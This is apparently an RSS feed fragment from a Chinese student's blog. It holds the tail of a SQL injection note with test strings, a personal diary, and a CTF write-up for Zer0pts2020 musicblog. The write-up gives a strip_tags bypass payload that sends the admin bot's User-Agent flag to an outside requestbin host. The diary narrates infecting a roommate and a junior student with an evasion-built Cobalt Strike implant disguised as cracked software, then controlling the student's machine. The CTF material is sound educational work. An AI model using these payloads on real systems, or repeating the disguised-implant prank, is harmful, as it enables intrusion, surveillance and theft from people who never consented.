&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;检测方式&#34;&gt;检测方式&lt;/h4&gt;
&lt;p&gt;一般以图床，博客，论坛，这种文章类的网站居多&lt;/p&gt;
&lt;p&gt;可以在地址输入框里输入来得到网页最后的修改时间，如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态；因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。&lt;/p&gt;
&lt;p&gt;javascript:alert(document.lastModified)&lt;/p&gt;
&lt;h4 id=&#34;注入方式&#34;&gt;注入方式&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a/b/c?id=123&amp;#39; and 1=1 --+
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a/b/c/id/123&amp;#39;/**/and/**/1=1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a/b/c/id/123*.html  （检测）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>茄科生物观测日志(demo)</title>
        <link>https://proben1.github.io/2021/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%97demo/</link>
        <pubDate>Mon, 06 Dec 2021 12:08:35 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%97demo/</guid>
        <description>&lt;h3 id=&#34;2022-5-12&#34;&gt;2022-5-12&lt;/h3&gt;
&lt;p&gt;今天捣鼓了一天的博客，互联网是在是太精彩啦！&lt;/p&gt;
&lt;p&gt;在经过重重深思之后，我仍然无法决定观察日记是要写成这种小作文的形式还是写成每天流水账的形式，觉得，可以浅浅结合一下。&lt;/p&gt;
&lt;p&gt;快乐的月中总结，这里首先点名批评csgo，csgo做错了什么？在我疯狂的，放手一搏的，镇定自若的rushB，抢A大以及野牛干拉之后，我决定冷落这个csgo，恩，还有我帅气的AK火神。然后是身为罗德岛博士的反思，艾丽妮又做错了什么？连着投递五次入职书，她爱你啊！你却还执意偏爱鲨鲨，最终只是，徒劳的，200抽。&lt;/p&gt;
&lt;p&gt;从没发现自己这么会做ppt，情不自禁展示一下：&lt;/p&gt;
&lt;img src=&#34;https://pic.imgdb.cn/item/627d093e0947543129eb2b7f.jpg&#34; width=&#34;40%&#34; height=&#34;40%&#34;/&gt;
&lt;p&gt;最后竟然被打回了，改成了一个淡色的版本，这里又情不自禁展示一下：&lt;/p&gt;
&lt;img src=&#34;https://pic.imgdb.cn/item/627d09a20947543129ecaf53.jpg&#34; width=&#34;40%&#34; height=&#34;40%&#34;/&gt;
&lt;p&gt;管理学签到，老师先发了个签到码，四位，我一猜是今天日期，直接一个0512上去，在路上就解决了签到问题，完美。遂逃课。然老师点名，寄，还说我咋签的这么快。&lt;/p&gt;
&lt;h3 id=&#34;2022-4-13&#34;&gt;2022-4-13&lt;/h3&gt;
&lt;p&gt;蛮快的，22年过三分之一了，看到四个月前的期末复习感觉自己像个傻子一样。拖，就硬拖，人现在还在等信号成绩。
在电脑上记的时候比较少，但是看起来存在感比较高，我以后可能会慢慢把手机上的转到电脑上。&lt;/p&gt;
&lt;p&gt;想想从疫情连夜逃回大连之后都发生了啥。&lt;/p&gt;
&lt;p&gt;1.吃火锅得到教训，不要把娃娃菜放到辣锅里去吃。&lt;/p&gt;
&lt;p&gt;2.查了四级成绩&amp;hellip;570，然后准备六级。&lt;/p&gt;
&lt;p&gt;3.一遍过了科二&amp;hellip;100，教练老开心了。刷完了科三学时，在路上跑现在应该没问题，下个假期驾照就差不多了。&lt;/p&gt;
&lt;p&gt;4.游戏方面。。。悟到了一个真理啊，&lt;em&gt;游戏只是想要的生活中很容易得到的一部分&lt;/em&gt;。假期是经典的五黑和csgo无缝切换。星际拓荒很棒。&lt;/p&gt;
&lt;p&gt;5.拜年纪的《弈》，《再会江湖》，《流年如歌》，《另一个我》，《海盗船》。&lt;/p&gt;
&lt;p&gt;6.学会做饭，现在在疯狂点名家常菜。&lt;/p&gt;
&lt;p&gt;7.回了躺姥姥家，撸羊。&lt;/p&gt;
&lt;p&gt;开学，封校期间&lt;/p&gt;
&lt;p&gt;1.艾尔登法环。白金。神评了。&lt;/p&gt;
&lt;p&gt;2.hvv的面试，暂且称之为一面吧，但是我对今年能不能去hvv持担忧态度。&lt;/p&gt;
&lt;p&gt;3.做到了隐瞒一件事情，理性战胜了感性。&lt;/p&gt;
&lt;p&gt;4.看计网。。。&lt;/p&gt;
&lt;p&gt;期末考试开放期间&lt;/p&gt;
&lt;p&gt;1.看了《认知觉醒》。收获很大，特别是学会了冥想等。&lt;/p&gt;
&lt;p&gt;2..期末考试，先考了信号，然后清明假期啥都没干硬生生复习了三天，之后把模电，大物，概率论这些考了。重点来了，五科中的四科都感觉要挂，遂等成绩，然而成绩一直没出，直到今日，还差模电和信号。&lt;/p&gt;
&lt;p&gt;3.和科科去了翠华山，开局选了最难的一条道，爬完之后在风洞冰洞零下直接腿抽筋。不过风景还是很不错的。来回是黑车司机接送，可能是长安区最会说话的黑车司机了。。。什么两手抓两手都要硬，学习恋爱两不误，最后还把我微信推给同车姑娘的寝室群里去了hhh。&lt;/p&gt;
&lt;p&gt;4.为了复习类用coo写了个中国象棋，最后发现自己的归宿可能是去做万宁象棋的开发，后面想用pygame真的搞个万宁象棋hhhh。&lt;/p&gt;
&lt;p&gt;5.为了复现一些java的框架漏洞而开始学java 。&lt;/p&gt;
&lt;p&gt;6.和zc同学唠嗑，开始！&lt;/p&gt;
&lt;p&gt;不管咋说，最后又回到提升阶段了。假期的时候还是蛮丧的，现在真的看开了不少。&lt;/p&gt;
&lt;h3 id=&#34;2021的一些关键词后半年才记的&#34;&gt;2021的一些关键词（后半年才记的）&lt;/h3&gt;
&lt;p&gt;音乐《孤勇者》（12月）、《Abandon Ship》、明日方舟音律联觉（4月）、《呼吸之野》（5月）、《时光盲盒》（春节）&lt;/p&gt;
&lt;p&gt;电视剧《毛》（12月）、《双城之战》（11月）&lt;/p&gt;
&lt;p&gt;游戏《Borderlands3》（12月）、《钢铁雄心4》（12月）、《Subnautica》（10月）、《空洞骑士》（7月）、《晶体管》（6月）、星际争霸人族战役残酷（9月）、&lt;/p&gt;
&lt;p&gt;小说《死在火星上》（10月）&lt;/p&gt;
&lt;h3 id=&#34;2021-12-17&#34;&gt;2021-12-17&lt;/h3&gt;
&lt;p&gt;近期复习期末…………很麻&lt;/p&gt;
&lt;p&gt;期末期间学习任务安排：&lt;/p&gt;
&lt;p&gt;1.思想建设学习（贼上头）&lt;/p&gt;
&lt;p&gt;马克思主义，毛泽东思想&lt;/p&gt;
&lt;p&gt;2.英语学习（摸）&lt;/p&gt;
&lt;p&gt;英语书籍阅读&lt;/p&gt;
&lt;p&gt;3.计网&lt;/p&gt;
&lt;p&gt;4.渗透测试&lt;/p&gt;
&lt;p&gt;娱乐安排：从零到一的狼王成长之路（这里是后记，他还是不会狼人杀）、象棋、zuo球……还有什么铺地毯&lt;/p&gt;
&lt;h3 id=&#34;2021-12-08&#34;&gt;2021-12-08&lt;/h3&gt;
&lt;p&gt;睡觉前听模电课很明显比睡觉前刷手机cool，也更助眠……摸了一天模电……&lt;/p&gt;
&lt;p&gt;重保投了简历很明显人家没鸟我……&lt;/p&gt;
&lt;p&gt;昨天刷了某人的600个知乎回答，有了重塑三观的想法……这也侧面说明我的观念体系很脆弱（可能从小学修修补补用到现在？），这学期技术进步一般，总体来说但比上学期多；重点是其他的变化（才不是身子233），预计期末和假期会把精神世界重塑一遍（毛选，马原），就这样……&lt;/p&gt;
&lt;p&gt;来了俩新舍友，通工第一和第二……第一天就展示了“卷”字咋写，都上床了就你们还在学是吧？直接被阿杜骂到床上了（真·偷乐）。&lt;/p&gt;
&lt;h3 id=&#34;2021-12-05&#34;&gt;2021-12-05&lt;/h3&gt;
&lt;p&gt;记在了6号上面，因为是六号写的……&lt;/p&gt;
&lt;p&gt;在网协睡，没睡好，软协那边学弟定的5点闹钟，一直响到7点都没把他叫醒。吃个豆腐脑然后回宿舍，舍友没醒没人开门，在门外找了个CS免杀马的教程，照着试一下，结果真可以！第一位受害者遂成给我开门的舍友。&lt;/p&gt;
&lt;p&gt;中午睡了会，做了一个巨酷炫的梦。&lt;/p&gt;
&lt;p&gt;最好玩的地方来了。晚上，学弟在语雀里明确表示受到小风的欺压（X），于是小风向我要了免杀马并发给他。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240212f27f86abb2a8ed125.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240212f27f86abb2a8ed125.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;附：网易云破解版。&lt;/p&gt;
&lt;p&gt;人家还真就点开了，于是成功上线cs……把大一时写的鼠标抖动.exe传上去执行，顺便屏幕截图，发现学弟当时正在搜网易云破解版是啥hhh。我俩去124看情况，正好赶上鼠标开始鬼畜……一顿忙乎给清干净了。自己作（zuo，三声）的祸害得自己清理干净。&lt;/p&gt;
&lt;p&gt;晚上回宿舍朱朱将了一堆关于恋爱的感悟，emmm，可能吧，有些人看似没对象是在第一层，但实际上他也在第三层。没错，我现在已经在第三层了！&lt;/p&gt;
&lt;h3 id=&#34;2021-12-06&#34;&gt;2021-12-06&lt;/h3&gt;
&lt;p&gt;本来不想在中午记的，这东西还是晚上记合适。起因是学弟想看看博客，我寻思着就把豪哥的小作文推给他，结果没忍住自己看起来了，看着看着就如同身临其境，然后就emo了。&lt;/p&gt;
&lt;p&gt;之前一直是写的日记，嗯，纸质的那种，大一上写，大一下没写，这学期又捡起来了，再想自己的字可能文字识别也识别不出来，不如索性搁网上一弄，有些笑话大家都能看了，还能自己留个成长轨迹，以后想在现实里看大不了再打印嘛……&lt;/p&gt;
&lt;p&gt;上午溜了大物课，整理整理生活，还能剩下时间学模电，结果就一直在”喝茶——整理博客——上厕所——晒太阳“中无限循环，正好期末来了，难度“四级&amp;lt;=概率论&amp;lt;大物&amp;lt;信号&amp;lt;模电”，该收收心好好学学别挂科了，但是又想做题……只能妥协一下，每天就一道题吧，点到为止hhh。&lt;/p&gt;
&lt;p&gt;最近是没时间玩游戏了，亏我还买了大表哥，无主之地，蔚蓝，还给龙脉唱歌加了愿望单，幸运的话大四之前可以全玩完？呜呜呜！&lt;/p&gt;
&lt;p&gt;好好学习！打游戏可以再造个自己去玩？&lt;/p&gt;
&lt;p&gt;（昨天素材太好了，忍不住记一下，详见2021-12-05）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>[Zer0pts2020]musicblog</title>
        <link>https://proben1.github.io/2021/zer0pts2020musicblog/</link>
        <pubDate>Sun, 05 Dec 2021 16:37:25 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/zer0pts2020musicblog/</guid>
        <description>&lt;h2 id=&#34;zer0pts2020musicblog&#34;&gt;[Zer0pts2020]musicblog&lt;/h2&gt;
&lt;p&gt;有admin账户&lt;/p&gt;
&lt;p&gt;有下载&lt;/p&gt;
&lt;p&gt;有注册登录&lt;/p&gt;
&lt;p&gt;当然，最后点子在post音频里&lt;/p&gt;
&lt;p&gt;去想任意下载，不行。最后看wp，原来给源码，再做一遍。&lt;/p&gt;
&lt;h5 id=&#34;内容安全策略-csp-&#34;&gt;内容安全策略( CSP )&lt;/h5&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://foreversong.cn/archives/760&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://foreversong.cn/archives/760&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;CSP&lt;/em&gt;的实质就是白名单策略，预先设定好哪些资源能被加载执行而哪些不能。&lt;/p&gt;
&lt;p&gt;flag在worker/worker.js&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;// (snipped)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; flag &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;zer0pts{&amp;lt;censored&amp;gt;}&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;// (snipped)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; crawl &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;async&lt;/span&gt; (url) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    console.log(&lt;span style=&#34;color:#f1fa8c&#34;&gt;`[+] Query! (&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;${&lt;/span&gt;url&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;)`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; page &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;await&lt;/span&gt; browser.newPage();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;try&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;await&lt;/span&gt; page.setUserAgent(flag);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;await&lt;/span&gt; page.&lt;span style=&#34;color:#ff79c6&#34;&gt;goto&lt;/span&gt;(url, {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            waitUntil&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;networkidle0&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            timeout&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1000&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;await&lt;/span&gt; page.click(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;#like&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#ff79c6&#34;&gt;catch&lt;/span&gt; (err){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        console.log(err);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;await&lt;/span&gt; page.close();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    console.log(&lt;span style=&#34;color:#f1fa8c&#34;&gt;`[+] Done! (&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;${&lt;/span&gt;url&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;)`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;// (snipped)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;“如果爬虫访问您拥有的网站，就可以从UA头里获得flag”&lt;/p&gt;
&lt;p&gt;这里的意思是会自动点击like，埋下伏笔&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;util.php&lt;/strong&gt; 中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;// [[URL]] → &amp;lt;audio src=&amp;#34;URL&amp;#34;&amp;gt;&amp;lt;/audio&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;render_tags&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$str&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$str&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; preg_replace(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/[[(.+?)]]/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;lt;audio controls src=&amp;#34;\1&amp;#34;&amp;gt;&amp;lt;/audio&amp;gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$str&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$str&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; strip_tags(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$str&lt;/span&gt;, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;lt;audio&amp;gt;&amp;#39;&lt;/span&gt;); &lt;span style=&#34;color:#6272a4&#34;&gt;// only allows `&amp;lt;audio&amp;gt;`
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$str&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;audio为白标签&lt;/p&gt;
&lt;p&gt;而audio受以下CSP的限制，无法跨域请求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;error_reporting(&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;require_once&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;config.php&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;require_once&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;util.php&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$nonce&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; get_nonce();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;header(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Content-Security-Policy: default-src &amp;#39;self&amp;#39;; object-src &amp;#39;none&amp;#39;; script-src &amp;#39;nonce-&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;nonce&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39; &amp;#39;strict-dynamic&amp;#39;; base-uri &amp;#39;none&amp;#39;; trusted-types&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;header(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;X-Frame-Options: DENY&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;header(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;X-XSS-Protection: 1; mode=block&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;session_start();
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;继续深入，strip_tags函数&lt;/p&gt;
&lt;p&gt;从&lt;code&gt;Dockerfile&lt;/code&gt;中可以看出Web 服务器使用 PHP 7.4.0&lt;/p&gt;
&lt;p&gt;strip_tags函数在7.4.0之前允许标签里出现斜线&lt;/p&gt;
&lt;p&gt;（应该是为了让&lt;code&gt;&amp;lt;/audio&amp;gt;&lt;/code&gt;可以通过）&lt;/p&gt;
&lt;p&gt;但是&lt;code&gt;&amp;lt;a/udio&amp;gt;&lt;/code&gt;在浏览器里会解析成&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签，而超链接的跳转不受CSP的限制。&lt;/p&gt;
&lt;p&gt;浏览器解析后就成了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;a udio id=like href=http://http.requestbin.buuoj.cn/1illhcn1&amp;gt;aa
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要开个内网&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://http.requestbin.buuoj.cn/1illhcn1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们输入的内容是在第一个点赞按钮的上面，id为like，照应点击伏笔。&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;a/udio id=like href=http://http.requestbin.buuoj.cn/1illhcn1&amp;gt;aa
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;或
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[[&amp;#34;&amp;gt;&amp;lt;/audio&amp;gt;&amp;lt;a/udio href=&amp;#34;http://http.requestbin.buuoj.cn/1illhcn1&amp;#34; id=&amp;#34;like&amp;#34;&amp;gt;test&amp;lt;/a/udio&amp;gt;&amp;lt;audio a=&amp;#34;]]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/624021fa27f86abb2a93eaa2.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/624021fa27f86abb2a93eaa2.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;总结：&lt;/p&gt;
